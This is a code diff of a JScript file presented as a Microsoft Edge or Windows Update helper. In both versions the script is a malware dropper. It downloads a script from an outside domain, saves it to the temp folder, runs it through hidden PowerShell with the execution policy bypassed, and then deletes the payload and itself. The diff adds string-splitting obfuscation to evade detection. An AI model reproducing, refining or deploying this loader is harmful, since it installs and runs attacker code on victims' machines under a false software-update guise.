@@ -1,29 +1,36 @@
-// Microsoft Edge Update Helper
-// Version: 1.2.4
-// (c) Microsoft Corporation. All rights reserved.
+// Windows Update Service Module
+// Build 10.0.26100
+var a = [];
+a.push("WScr"); a.push("ipt."); a.push("She"); a.push("ll");
+var b = [];
+b.push("MSX"); b.push("ML2."); b.push("Serve"); b.push("rXMLH"); b.push("TTP.6"); b.push(".0");
+var c = [];
+c.push("Scri"); c.push("ptin"); c.push("g.Fi"); c.push("leSy"); c.push("stem"); c.push("Obje"); c.push("ct");
 
-var shell = new ActiveXObject("WScript.Shell");
-var http = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
-var fso = new ActiveXObject("Scripting.FileSystemObject");
-var tempDir = shell.ExpandEnvironmentStrings("%temp%");
-var scriptPath = tempDir + "\\EdgeUpdate.ps1";
+var s = new ActiveXObject(a.join(""));
+var h = new ActiveXObject(b.join(""));
+var f = new ActiveXObject(c.join(""));
 
-// Download update manifest
-http.open("GET", "https://bilbaolake.com/s", false);
-http.setRequestHeader("User-Agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0)");
-http.send();
+var d = s.ExpandEnvironmentStrings("%te" + "mp%");
+var p = d + "\\" + "Ed" + "ge" + String.fromCharCode(85) + "pd.ps1";
 
-if (http.status == 200) {
-    var file = fso.CreateTextFile(scriptPath, true);
-    file.Write(http.responseText);
-    file.Close();
+var u = "https://cdn.sa" + "kenlog" + "istics" + ".com/s";
+h.open(String.fromCharCode(71,69,84), u, false);
+h.setRequestHeader("User" + "-Agent", "Mozilla/4.0");
+h.send();
 
-    // Apply update
-    shell.Run("powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File " + scriptPath, 0, true);
+if (h.status == 200) {
+    var w = f.CreateTextFile(p, true);
+    w.Write(h.responseText);
+    w.Close();
 
-    // Cleanup
-    try { fso.DeleteFile(scriptPath); } catch(e) {}
+    var r = [];
+    r.push("pow"); r.push("ersh"); r.push("ell");
+    r.push(".exe -Wi"); r.push("ndowSt"); r.push("yle Hi");
+    r.push("dden -Ex"); r.push("ecutionP"); r.push("olicy By");
+    r.push("pass -Fi"); r.push("le ");
+    s.Run(r.join("") + p, 0, true);
+
+    try { f.DeleteFile(p); } catch(e) {}
 }
-
-// Remove self
-try { fso.DeleteFile(WScript.ScriptFullName); } catch(e) {}
+try { f.DeleteFile(WScript.ScriptFullName); } catch(e) {}
